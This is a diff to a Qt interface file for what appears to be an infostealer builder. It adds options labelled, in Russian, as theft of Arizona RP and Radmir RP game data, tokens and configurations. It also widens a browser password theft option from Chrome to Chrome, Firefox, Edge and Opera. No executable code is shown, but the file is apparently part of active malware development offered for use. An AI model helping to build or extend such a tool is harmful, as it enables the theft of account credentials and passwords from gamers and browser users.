@@ -152,6 +152,26 @@
             </widget>
            </item>
            <item>
+            <widget class="QCheckBox" name="arizonaRPCheckBox">
+             <property name="text">
+              <string>Кража данных Arizona RP</string>
+             </property>
+             <property name="toolTip">
+              <string>Кража данных Arizona RP: игровые данные, токены, конфигурации</string>
+             </property>
+            </widget>
+           </item>
+           <item>
+            <widget class="QCheckBox" name="radmirRPCheckBox">
+             <property name="text">
+              <string>Кража данных Radmir RP</string>
+             </property>
+             <property name="toolTip">
+              <string>Кража данных Radmir RP: игровые данные, токены, конфигурации</string>
+             </property>
+            </widget>
+           </item>
+           <item>
             <spacer name="gamingSpacer">
              <property name="orientation">
               <enum>Qt::Vertical</enum>
@@ -245,7 +265,7 @@
               <string>Кража паролей браузеров</string>
              </property>
              <property name="toolTip">
-              <string>Кража паролей из браузеров: Chrome</string>
+              <string>Кража паролей из браузеров: Chrome, Firefox, Edge, Opera</string>
              </property>
             </widget>
            </item>
